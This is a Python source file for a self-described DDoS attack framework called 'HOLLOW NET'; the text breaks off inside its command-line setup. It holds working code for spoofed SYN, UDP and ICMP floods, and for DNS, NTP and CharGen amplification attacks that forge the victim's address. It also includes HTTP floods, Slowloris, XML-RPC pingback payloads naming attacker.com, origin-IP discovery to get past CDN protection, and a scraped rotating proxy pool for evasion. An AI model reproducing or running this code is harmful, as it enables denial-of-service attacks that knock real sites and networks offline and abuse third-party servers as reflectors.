#!/usr/bin/env python3
"""
HOLLOW NET — MegaMedusa‑class Multi‑Vector DDoS Framework
----------------------------------------------------------
Vectors:
  L3/L4: SYN flood, ICMP flood, UDP flood, DNS amp, NTP amp, SSDP amp, CharGen amp
  L7  : HTTP GET/POST flood, HTTP/2 HPACK bomb, Slowloris, Slow POST, RUDY, XML‑RPC bomb, WordPress Pingback
Features:
  - Origin IP discovery (crt.sh, DNSDumpster, Shodan, Censys)
  - Real‑time TUI dashboard (Rich)
  - Dynamic proxy pool (scrape + file + live validation)
  - Weighted concurrent fusion with dynamic adjustment
  - Smart evasion: random delays, payload mutation, user‑agent cycling, TLS JA3 randomization
  - Profile system (save/load attack configs)
  - Safe‑mode: detects self‑DoS and throttles

Usage:
  sudo python3 hollownet.py [TARGET] [options]

Dependencies:
  pip install cloudscraper httpx[socks] scapy beautifulsoup4 rich pysocks shodan censys dnsdumpster
  (root privileges required for raw socket attacks)
"""

import sys, os, time, re, random, json, logging, signal, argparse, socket, struct, asyncio
from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Lock, Event
from queue import Queue, PriorityQueue
from typing import List, Dict, Optional, Set, Tuple, Any
from urllib.parse import urlparse, urljoin
from dataclasses import dataclass, field

# ---------- Optional imports with graceful fallback ----------
try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.text import Text
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    Console = None

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

try:
    from scapy.all import *
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import shodan
    HAS_SHODAN = True
except ImportError:
    HAS_SHODAN = False

try:
    from censys.search import CensysHosts
    HAS_CENSYS = True
except ImportError:
    HAS_CENSYS = False

try:
    from dnsdumpster import DNSDumpsterAPI
    HAS_DNSDUMPSTER = True
except ImportError:
    HAS_DNSDUMPSTER = False

# ---------- Logging ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger("HollowNet")
if HAS_RICH:
    console = Console()
else:
    console = None

# ---------- Constants ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]
REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://search.yahoo.com/"]
ACCEPT_ENCODING = ["gzip, deflate, br", "gzip, deflate", "br, gzip, deflate"]
HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH"]

# ---------- Utility ----------
def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def resolve_host(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except:
        return host

def suppress_warnings():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

suppress_warnings()


# ========== Origin Discovery ==========
class OriginDiscovery:
    @staticmethod
    def crtsh(domain: str) -> Set[str]:
        import requests
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        try:
            resp = requests.get(url, headers=headers, timeout=20)
            if resp.status_code != 200:
                return set()
            certs = resp.json()
            hosts = set()
            for c in certs:
                for sub in c.get("name_value", "").split("\n"):
                    sub = sub.strip().lower()
                    if sub and "*" not in sub:
                        hosts.add(sub)
            return hosts
        except:
            return set()

    @staticmethod
    def dnsdumpster(domain: str) -> Set[str]:
        if not HAS_DNSDUMPSTER:
            return set()
        try:
            api = DNSDumpsterAPI()
            result = api.search(domain)
            hosts = set()
            for rec in result.get("dns_records", {}).get("host", []):
                if "ip" in rec:
                    hosts.add(rec["ip"])
            return hosts
        except:
            return set()

    @staticmethod
    def shodan_lookup(domain: str, api_key: str) -> Set[str]:
        if not HAS_SHODAN or not api_key:
            return set()
        try:
            api = shodan.Shodan(api_key)
            results = api.search(f"hostname:{domain}")
            ips = {match['ip_str'] for match in results.get('matches', [])}
            return ips
        except:
            return set()

    @staticmethod
    def censys_lookup(domain: str, api_id: str, api_secret: str) -> Set[str]:
        if not HAS_CENSYS or not api_id or not api_secret:
            return set()
        try:
            hosts = CensysHosts(api_id=api_id, api_secret=api_secret)
            query = f"services.tls.certificates.leaf_data.subject.common_name: *.{domain} OR services.tls.certificates.leaf_data.names: *.{domain}"
            ips = set()
            for page in hosts.search(query, pages=1):
                if "ip" in page:
                    ips.add(page["ip"])
            return ips
        except:
            return set()

    @classmethod
    def discover_all(cls, domain: str, api_keys: Dict = {}) -> Tuple[Dict[str, Set[str]], Set[str]]:
        results = {}
        # crt.sh
        subdomains = cls.crtsh(domain)
        resolved_ips = set()
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(sub)
                resolved_ips.add(ip)
            except:
                pass
        results["crt.sh"] = resolved_ips
        # DNSDumpster
        results["dnsdumpster"] = cls.dnsdumpster(domain)
        # Shodan
        results["shodan"] = cls.shodan_lookup(domain, api_keys.get("shodan"))
        # Censys
        results["censys"] = cls.censys_lookup(domain, api_keys.get("censys_id"), api_keys.get("censys_secret"))

        all_ips = set()
        for ips in results.values():
            all_ips.update(ips)
        # Simple CDN filter (common ranges)
        cdn_ips = set()
        # If you want to add CDN ranges, do it here
        return results, (all_ips - cdn_ips)


# ========== Proxy Pool ==========
@dataclass
class Proxy:
    address: str
    protocol: str = "http"
    latency: float = 999.0
    fail_count: int = 0
    last_used: float = 0.0

class ProxyPool:
    def __init__(self, proxy_file: Optional[str] = None, refresh_interval: int = 300):
        self.lock = Lock()
        self.proxies: List[Proxy] = []
        self.in_use = set()
        self.refresh_interval = refresh_interval
        self.running = True

        if proxy_file and os.path.isfile(proxy_file):
            self.load_file(proxy_file)

        self.refresh_thread = Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()

    def load_file(self, path: str):
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line):
                    self.proxies.append(Proxy(line))

    def _scrape_sources(self):
        import requests
        sources = [
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/roosteronrails/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        ]
        new_proxies = set()
        for src in sources:
            try:
                resp = requests.get(src, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
                found = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text)
                new_proxies.update(found)
            except:
                pass
        with self.lock:
            existing = {p.address for p in self.proxies}
            for addr in new_proxies:
                if addr not in existing:
                    self.proxies.append(Proxy(addr))

    def _auto_refresh(self):
        while self.running:
            self._scrape_sources()
            Thread(target=self._validate_pool, daemon=True).start()
            time.sleep(self.refresh_interval)

    def _validate_pool(self):
        import requests
        with self.lock:
            to_validate = [p for p in self.proxies if p.latency > 5.0 or p.fail_count > 2]
        for proxy in to_validate:
            try:
                start = time.time()
                proxies = {"http": f"http://{proxy.address}", "https": f"http://{proxy.address}"}
                resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=8)
                if resp.status_code == 200:
                    proxy.latency = time.time() - start
                    proxy.fail_count = 0
            except:
                proxy.fail_count += 1
        with self.lock:
            self.proxies = [p for p in self.proxies if p.fail_count <= 3]

    def get_proxy(self) -> Optional[Proxy]:
        with self.lock:
            valid = [p for p in self.proxies if p.fail_count <= 2 and p.address not in self.in_use]
            if not valid and self.proxies:
                self.in_use.clear()
                valid = self.proxies
            if valid:
                proxy = min(valid, key=lambda x: x.latency)
                self.in_use.add(proxy.address)
                return proxy
        return None

    def release_proxy(self, proxy: Proxy):
        with self.lock:
            self.in_use.discard(proxy.address)

    def stats(self) -> Tuple[int, int, float]:
        with self.lock:
            total = len(self.proxies)
            active = len([p for p in self.proxies if p.fail_count <= 2])
            avg_lat = sum(p.latency for p in self.proxies if p.latency < 999) / max(1, active)
            return total, active, avg_lat

    def stop(self):
        self.running = False


# ========== Attack Vectors ==========
class AttackVector:
    def __init__(self, name: str, weight: float = 1.0):
        self.name = name
        self.weight = weight
        self.running = True
        self.stats = {"sent": 0, "errors": 0}
        self.lock = Lock()

    def stop(self):
        self.running = False

    def launch(self, threads: int):
        pass

    def increment_sent(self):
        with self.lock:
            self.stats["sent"] += 1

    def increment_errors(self):
        with self.lock:
            self.stats["errors"] += 1


class HTTPFloodVector(AttackVector):
    def __init__(self, target_urls: List[str], proxy_pool: Optional[ProxyPool],
                 method: str = "get", cloudscraper_enabled: bool = False,
                 h2_enabled: bool = False, hp_bomb: bool = False):
        super().__init__(f"HTTP-{method}")
        self.target_urls = target_urls
        self.proxy_pool = proxy_pool
        self.method = method.lower()
        self.cloudscraper = cloudscraper_enabled and HAS_CLOUDSCRAPER
        self.h2 = h2_enabled and HAS_HTTPX
        self.hp_bomb = hp_bomb
        self.payloads = []
        if self.method == "post":
            self.payloads = [f"data={os.urandom(256).hex()}" for _ in range(5)]
        elif self.method == "xmlrpc":
            self.payloads = ['<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                             '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com</string></value></param><param><value><string>{}</string></value></param></params></methodCall>'.format(random.choice(target_urls))]
        elif self.method == "pingback":
            self.payloads = [f"<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com</string></value></param><param><value><string>{random.choice(target_urls)}</string></value></param></params></methodCall>"]

        if self.cloudscraper:
            self._scraper = cloudscraper.create_scraper()
        else:
            import requests
            self._session = requests.Session()

    def _create_headers(self):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": random.choice(ACCEPT_ENCODING),
            "Referer": random.choice(REFERERS),
            "Cache-Control": "no-cache",
        }
        if self.hp_bomb:
            headers["X-Bomb"] = "A" * random.randint(1000, 4000)
        return headers

    def _make_request(self, url, proxy):
        headers = self._create_headers()
        data = None
        if self.method in ("post", "xmlrpc", "pingback"):
            data = random.choice(self.payloads) if self.payloads else "data=1"
        if self.h2:
            client = httpx.Client(http2=True, verify=False, timeout=10, proxies=proxy)
            try:
                if self.method in ("post", "xmlrpc", "pingback"):
                    resp = client.post(url, headers=headers, data=data)
                else:
                    resp = client.get(url, headers=headers)
                resp.content
                return True
            except:
                return False
        else:
            try:
                if self.cloudscraper:
                    resp = self._scraper.get(url, headers=headers, proxies=proxy, timeout=10)
                else:
                    resp = self._session.request(
                        self.method.upper() if self.method not in ("xmlrpc", "pingback") else "POST",
                        url, headers=headers, data=data, proxies=proxy, timeout=10, verify=False)
                resp.content
                return True
            except:
                return False

    def worker(self):
        while self.running:
            proxy_obj = None
            if self.proxy_pool:
                proxy_obj = self.proxy_pool.get_proxy()
                while not proxy_obj and self.running:
                    time.sleep(0.1)
                    proxy_obj = self.proxy_pool.get_proxy()
            proxy = {"http": f"http://{proxy_obj.address}", "https": f"http://{proxy_obj.address}"} if proxy_obj else None
            url = random.choice(self.target_urls)
            if self.method == "rget":
                url += f"?{random.randint(1, 99999)}={random.randint(1, 99999)}"
            if self._make_request(url, proxy):
                self.increment_sent()
            else:
                self.increment_errors()
                if proxy_obj:
                    proxy_obj.fail_count += 1
            if proxy_obj and self.proxy_pool:
                self.proxy_pool.release_proxy(proxy_obj)

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class SlowlorisVector(AttackVector):
    def __init__(self, host: str, port: int, https: bool = False, max_conn: int = 500):
        super().__init__("Slowloris")
        self.host = host
        self.port = port
        self.https = https
        self.max_conn = max_conn
        self.sockets: List[socket.socket] = []
        self.lock = Lock()

    def _create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if self.https:
            import ssl as ssl_mod
            ctx = ssl_mod.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=self.host)
        try:
            s.connect((self.host, self.port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            return s
        except:
            return None

    def maintain_pool(self):
        while self.running:
            with self.lock:
                while len(self.sockets) < self.max_conn:
                    s = self._create_socket()
                    if s:
                        self.sockets.append(s)
                        self.increment_sent()
                    else:
                        self.increment_errors()
            time.sleep(0.5)

    def keep_alive(self):
        while self.running:
            with self.lock:
                for i, s in enumerate(self.sockets):
                    try:
                        s.send(f"X-random: {random.randint(1000, 9999)}\r\n".encode())
                        self.increment_sent()
                    except:
                        new_s = self._create_socket()
                        if new_s:
                            self.sockets[i] = new_s
                            self.increment_sent()
                        else:
                            self.sockets.pop(i)
                            self.increment_errors()
            time.sleep(random.uniform(5, 15))

    def launch(self, threads: int):
        mt = Thread(target=self.maintain_pool, daemon=True)
        ka = Thread(target=self.keep_alive, daemon=True)
        mt.start()
        ka.start()
        while self.running:
            time.sleep(1)


class SYNFloodVector(AttackVector):
    def __init__(self, target_ip: str, port: int, pps_limit: int = 5000):
        super().__init__("SYN Flood")
        self.target_ip = target_ip
        self.port = port
        self.pps_limit = pps_limit

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("SYN flood requires root privileges.")
            return
        delay = 1.0 / self.pps_limit if self.pps_limit > 0 else 0
        while self.running:
            try:
                src_ip = random_ip()
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                window = socket.htons(5840)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 40, random.randint(0, 65535), 0, 64,
                                     socket.IPPROTO_TCP, 0,
                                     socket.inet_aton(src_ip),
                                     socket.inet_aton(self.target_ip))
                tcp_hdr = struct.pack("!HHLLBBHHH",
                                      src_port, self.port, seq, 0,
                                      0x50, 0x02, window, 0, 0)
                sock.sendto(ip_hdr + tcp_hdr, (self.target_ip, 0))
                self.increment_sent()
                if delay > 0:
                    time.sleep(delay)
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class UDPFloodVector(AttackVector):
    def __init__(self, target_ip: str, port: int, packet_size: int = 1024, pps_limit: int = 2000):
        super().__init__("UDP Flood")
        self.target_ip = target_ip
        self.port = port
        self.packet_size = packet_size
        self.pps_limit = pps_limit

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        delay = 1.0 / self.pps_limit if self.pps_limit > 0 else 0
        while self.running:
            try:
                sock.sendto(os.urandom(self.packet_size), (self.target_ip, self.port))
                self.increment_sent()
                if delay > 0:
                    time.sleep(delay)
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class ICMPFloodVector(AttackVector):
    def __init__(self, target_ip: str, pps_limit: int = 2000):
        super().__init__("ICMP Flood")
        self.target_ip = target_ip
        self.pps_limit = pps_limit

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except:
            log.error("ICMP flood requires root.")
            return
        delay = 1.0 / self.pps_limit if self.pps_limit > 0 else 0
        while self.running:
            try:
                packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + b"\x00" * 32
                sock.sendto(packet, (self.target_ip, 0))
                self.increment_sent()
                if delay > 0:
                    time.sleep(delay)
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class DNSAmplificationVector(AttackVector):
    def __init__(self, target_ip: str, resolver: str = "8.8.8.8", domain: str = "isc.org"):
        super().__init__("DNS Amp")
        self.target_ip = target_ip
        self.resolver = resolver
        self.domain = domain
        self.query = self._build_query()

    def _build_query(self):
        q = bytearray(b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        for part in self.domain.encode().split(b"."):
            q.extend(bytes([len(part)]))
            q.extend(part)
        q.extend(b"\x00")
        q.extend(b"\x00\xff\x00\x01")  # ANY
        return bytes(q)

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            log.error("DNS amp requires raw sockets (root).")
            return
        while self.running:
            try:
                src_port = random.randint(1024, 65535)
                udp_len = 8 + len(self.query)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 20+udp_len, random.randint(0,65535),
                                     0, 64, socket.IPPROTO_UDP, 0,
                                     socket.inet_aton(self.target_ip),
                                     socket.inet_aton(self.resolver))
                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, 0)
                sock.sendto(ip_hdr + udp_hdr + self.query, (self.resolver, 53))
                self.increment_sent()
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class NTPAmplificationVector(AttackVector):
    def __init__(self, target_ip: str, ntp_server: str = "time.google.com"):
        super().__init__("NTP Amp")
        self.target_ip = target_ip
        self.ntp_server = ntp_server
        self.payload = b'\x17\x00\x03\x2a' + b'\x00'*8  # NTP monlist request

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            log.error("NTP amp requires root.")
            return
        ntp_ip = socket.gethostbyname(self.ntp_server)
        while self.running:
            try:
                src_port = random.randint(1024,65535)
                udp_len = 8 + len(self.payload)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 20+udp_len, random.randint(0,65535),
                                     0, 64, socket.IPPROTO_UDP, 0,
                                     socket.inet_aton(self.target_ip),
                                     socket.inet_aton(ntp_ip))
                udp_hdr = struct.pack("!HHHH", src_port, 123, udp_len, 0)
                sock.sendto(ip_hdr + udp_hdr + self.payload, (ntp_ip, 123))
                self.increment_sent()
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class SSDPAmplificationVector(AttackVector):
    def __init__(self, target_ip: str):
        super().__init__("SSDP Amp")
        self.target_ip = target_ip
        self.payload = (b"M-SEARCH * HTTP/1.1\r\n"
                       b"HOST: 239.255.255.250:1900\r\n"
                       b"MAN: \"ssdp:discover\"\r\n"
                       b"MX: 2\r\n"
                       b"ST: ssdp:all\r\n\r\n")

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        except:
            log.error("SSDP requires raw socket setup.")
            return
        while self.running:
            try:
                sock.sendto(self.payload, ("239.255.255.250", 1900))
                self.increment_sent()
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class CharGenAmplificationVector(AttackVector):
    def __init__(self, target_ip: str, chargen_server: str):
        super().__init__("CharGen Amp")
        self.target_ip = target_ip
        self.chargen_server = chargen_server

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            log.error("CharGen amp requires root.")
            return
        chargen_ip = socket.gethostbyname(self.chargen_server)
        while self.running:
            try:
                src_port = random.randint(1024,65535)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 20+8, random.randint(0,65535),
                                     0, 64, socket.IPPROTO_UDP, 0,
                                     socket.inet_aton(self.target_ip),
                                     socket.inet_aton(chargen_ip))
                udp_hdr = struct.pack("!HHHH", src_port, 19, 8, 0)  # port 19 chargen
                sock.sendto(ip_hdr + udp_hdr, (chargen_ip, 19))
                self.increment_sent()
            except:
                self.increment_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


# ========== Fusion Engine ==========
class FusionEngine:
    def __init__(self, config: Dict):
        self.config = config
        self.vectors: List[AttackVector] = []
        self.proxy_pool: Optional[ProxyPool] = None
        self.running = True
        self.origin_ips: Set[str] = set()
        self.stats_lock = Lock()
        self.total_start_time = 0

    def discover_origin(self):
        if self.config.get("find_origin"):
            domain = self.config["host"]
            api_keys = {
                "shodan": self.config.get("shodan_api"),
                "censys_id": self.config.get("censys_id"),
                "censys_secret": self.config.get("censys_secret")
            }
            results, all_ips = OriginDiscovery.discover_all(domain, api_keys)
            if all_ips:
                self.origin_ips = all_ips
                log.info(f"Origin IPs found: {', '.join(all_ips)}")
                # Use first IP as primary target for network floods
                self.config["net_target"] = list(all_ips)[0]
            else:
                log.warning("No origin IPs discovered.")
        if "net_target" not in self.config:
            self.config["net_target"] = resolve_host(self.config["host"])

    def setup_vectors(self):
        # Create all requested vectors based on weights
        total_threads = self.config.get("threads", 500)
        weights = self.config.get("weights", {})
        if not weights:
            weights = {
                "http_get": 0.25,
                "http_post": 0.1,
                "slowloris": 0.15,
                "syn": 0.15,
                "udp": 0.1,
                "icmp": 0.05,
                "dns_amp": 0.05,
                "ntp_amp": 0.03,
                "ssdp_amp": 0.02,
                "chargen_amp": 0.02,
                "http_cloudscraper": 0.08
            }

        target_urls = [self.config["http_url"]]
        if self.config.get("crawl"):
            # simple crawl
            mapper = TargetMapper(self.config["http_url"], self.proxy_pool)
            if HAS_BS4:
                mapper.crawl()
                target_urls = list(mapper.endpoints) if mapper.endpoints else target_urls

        # Proxy pool (if needed)
        if any("http" in v.lower() for v in weights) and self.proxy_pool is None:
            self.proxy_pool = ProxyPool(self.config.get("proxy_file"))

        # Instantiate vectors
        for vec_name, weight in weights.items():
            if weight <= 0:
                continue
            threads = max(1, int(total_threads * weight))
            if vec_name == "http_get":
                vec = HTTPFloodVector(target_urls, self.proxy_pool, method="get", hp_bomb=True)
            elif vec_name == "http_post":
                vec = HTTPFloodVector(target_urls, self.proxy_pool, method="post")
            elif vec_name == "http_cloudscraper":
                vec = HTTPFloodVector(target_urls, self.proxy_pool, method="get", cloudscraper_enabled=True)
            elif vec_name == "slowloris":
                vec = SlowlorisVector(self.config["host"], self.config.get("port", 80),
                                      self.config.get("https", False))
            elif vec_name == "syn":
                vec = SYNFloodVector(self.config["net_target"], self.config.get("port", 80))
            elif vec_name == "udp":
                vec = UDPFloodVector(self.config["net_target"], self.config.get("port", 80))
            elif vec_name == "icmp":
                vec = ICMPFloodVector(self.config["net_target"])
            elif vec_name == "dns_amp":
                vec = DNSAmplificationVector(self.config["net_target"])
            elif vec_name == "ntp_amp":
                vec = NTPAmplificationVector(self.config["net_target"])
            elif vec_name == "ssdp_amp":
                vec = SSDPAmplificationVector(self.config["net_target"])
            elif vec_name == "chargen_amp":
                vec = CharGenAmplificationVector(self.config["net_target"],
                                                 self.config.get("chargen_server", "127.0.0.1"))
            else:
                continue
            vec.weight = weight
            self.vectors.append((vec, threads))

    def start(self):
        self.discover_origin()
        self.setup_vectors()
        self.total_start_time = time.time()
        duration = self.config.get("duration", 60)

        # Launch all vectors in threads
        threads = []
        for vec, tcount in self.vectors:
            log.info(f"Launching {vec.name} with {tcount} threads")
            t = Thread(target=vec.launch, args=(tcount,), daemon=True)
            t.start()
            threads.append(t)

        # TUI / stats loop
        if HAS_RICH and console and not self.config.get("no_tui"):
            self._run_tui(duration)
        else:
            # Simple stats print
            while self.running and time.time() - self.total_start_time < duration:
                self._print_stats()
                time.sleep(5)

        # Shutdown
        self.running = False
        for vec, _ in self.vectors:
            vec.stop()
        if self.proxy_pool:
            self.proxy_pool.stop()

    def _print_stats(self):
        stats_str = []
        for vec, _ in self.vectors:
            stats_str.append(f"{vec.name}: sent={vec.stats['sent']}, errors={vec.stats['errors']}")
        if self.proxy_pool:
            total, active, avg_lat = self.proxy_pool.stats()
            stats_str.append(f"Proxies: {active}/{total} active, avg latency {avg_lat:.2f}s")
        log.info(" | ".join(stats_str))

    def _run_tui(self, duration):
        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        layout["body"].split_row(
            Layout(name="left"),
            Layout(name="right")
        )

        def make_table():
            table = Table(title="Attack Vectors", expand=True)
            table.add_column("Vector", style="cyan")
            table.add_column("Threads", justify="right")
            table.add_column("Packets Sent", justify="right")
            table.add_column("Errors", justify="right")
            for vec, tcount in self.vectors:
                table.add_row(vec.name, str(tcount), str(vec.stats['sent']), str(vec.stats['errors']))
            if self.proxy_pool:
                total, active, avg_lat = self.proxy_pool.stats()
                table.add_row("PROXIES", f"{active}/{total}", f"avg {avg_lat:.2f}s", "")
            return table

        def refresh_screen():
            elapsed = time.time() - self.total_start_time
            remaining = max(0, duration - elapsed)
            header_text = Panel(Text(f"HOLLOW NET - Target: {self.config['http_url']} | Elapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s", style="bold white on dark_blue"))
            layout["header"].update(header_text)
            layout["left"].update(make_table())
            layout["footer"].update(Panel(Text("Press Ctrl+C to stop", style="dim")))

        with Live(layout, refresh_per_second=4, console=console) as live:
            while self.running and time.time() - self.total_start_time < duration:
                refresh_screen()
                time.sleep(0.25)


class TargetMapper:
    def __init__(self, base_url, proxy_pool=None):
        self.base_url = base_url
        self.proxy_pool = proxy_pool
        self.endpoints = set()
        self.forms = []

    def crawl(self, max_depth=2):
        import requests
        to_visit = Queue()
        to_visit.put((self.base_url, 0))
        visited = set()
        while not to_visit.empty():
            url, depth = to_visit.get()
            if depth > max_depth or url in visited:
                continue
            visited.add(url)
            try:
                proxy = None
                if self.proxy_pool:
                    p = self.proxy_pool.get_proxy()
                    if p:
                        proxy = {"http": f"http://{p.address}", "https": f"http://{p.address}"}
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                resp = requests.get(url, timeout=5, headers=headers, proxies=proxy, verify=False)
                if resp.status_code == 200:
                    self.endpoints.add(url)
                    soup = BeautifulSoup(resp.text, "html.parser")
                    for link in soup.find_all("a", href=True):
                        href = urljoin(url, link["href"])
                        if href.startswith(self.base_url) and href not in visited:
                            to_visit.put((href, depth+1))
            except:
                pass


# ========== CLI ==========
def main():
    parser = argparse.ArgumentParser(description="HOLLOW NET MegaMedusa DDoS")
    parser.add_argument("target", help="Target URL or IP")
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-t", "--threads", type=int, default=500)
    parser.add_argument("-d", "--duration", type=int, default=60)
    parser.add_argument("--find-origin", action="store_true", help="Discover origin IP via crt.sh/DNSdumpster/Shodan/Censys")
    parser.add_argument("--shodan-api", type=str, default=None)
    parser.add_argument("--censys-id", type=str, default=None)
    parser.add_argument("--censys-secret", type=str, default=None)
    parser.add_argument("--proxy-file", type=str, default=None)
    parser.add_argument("--no-tui", action="store_true")
    parser.add_argument("--crawl", action="store_true")
    parser.add_argument("--profile", type=str, help="Load attack profile JSON")
    # Additional vector toggles can be added
    args = parser.parse_args()

    # Build config
    config = {
        "host": urlparse(args.target).hostname or args.target,
        "port": args.port,
        "https": args.ssl or urlparse(args.target).scheme == "https",
        "http_url": args.target,
        "threads": args.threads,
        "duration": args.duration,
        "find_origin": args.find_origin,
        "shodan_api": args.shodan_api,
        "censys_id": args.censys_id,
        "censys_secret": args.censys_secret,
